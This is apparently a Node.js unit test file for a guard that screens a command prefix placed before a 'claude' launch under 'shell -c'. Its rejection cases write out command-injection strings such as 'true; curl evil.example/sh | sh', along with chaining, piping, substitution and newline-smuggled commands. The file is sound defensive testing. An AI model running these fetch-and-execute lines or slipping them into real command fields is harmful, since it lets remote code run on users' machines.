// test/pre-launch-cmd-guard.test.js — unit tests for the preLaunchCmd guard.
//
// preLaunchCmd is concatenated, raw, in front of the `claude ...` command
// line before the whole string goes through `shell -c`. The documented use
// case (aws-vault exec profile --) has no shell metacharacters at all — this
// guard must keep accepting it while refusing the constructs that let the
// prefix stop being just a prefix.
'use strict';

const test   = require('node:test');
const assert = require('node:assert/strict');

const { validatePreLaunchCmd } = require('../pre-launch-cmd-guard');

test('validatePreLaunchCmd: accepts the documented use case verbatim', () => {
  assert.deepEqual(validatePreLaunchCmd('aws-vault exec profile --'), { ok: true });
});

test('validatePreLaunchCmd: accepts a plain prefix with flags and no metacharacters', () => {
  assert.deepEqual(validatePreLaunchCmd('env -i HOME=/tmp'), { ok: true });
});

test('validatePreLaunchCmd: rejects a semicolon-chained second command', () => {
  const out = validatePreLaunchCmd('true; curl evil.example/sh | sh');
  assert.equal(out.ok, false);
});

test('validatePreLaunchCmd: rejects &&-chaining', () => {
  assert.equal(validatePreLaunchCmd('true && curl evil.example/sh').ok, false);
});

test('validatePreLaunchCmd: rejects background execution via &', () => {
  assert.equal(validatePreLaunchCmd('curl evil.example/sh &').ok, false);
});

test('validatePreLaunchCmd: rejects a pipe', () => {
  assert.equal(validatePreLaunchCmd('true | curl evil.example/sh').ok, false);
});

test('validatePreLaunchCmd: rejects backtick command substitution', () => {
  assert.equal(validatePreLaunchCmd('echo `whoami`').ok, false);
});

test('validatePreLaunchCmd: rejects $(...) command substitution', () => {
  assert.equal(validatePreLaunchCmd('echo $(whoami)').ok, false);
});

test('validatePreLaunchCmd: rejects embedded newlines / carriage returns', () => {
  assert.equal(validatePreLaunchCmd('true\ncurl evil.example/sh').ok, false);
  assert.equal(validatePreLaunchCmd('true\r\ncurl evil.example/sh').ok, false);
});

test('validatePreLaunchCmd: does not flag a bare $ or a single-quoted string', () => {
  // Deliberately narrow scope: bare variable expansion ($VAR) is not blocked.
  assert.equal(validatePreLaunchCmd('env FOO=$BAR').ok, true);
  assert.equal(validatePreLaunchCmd("echo 'hello world'").ok, true);
});
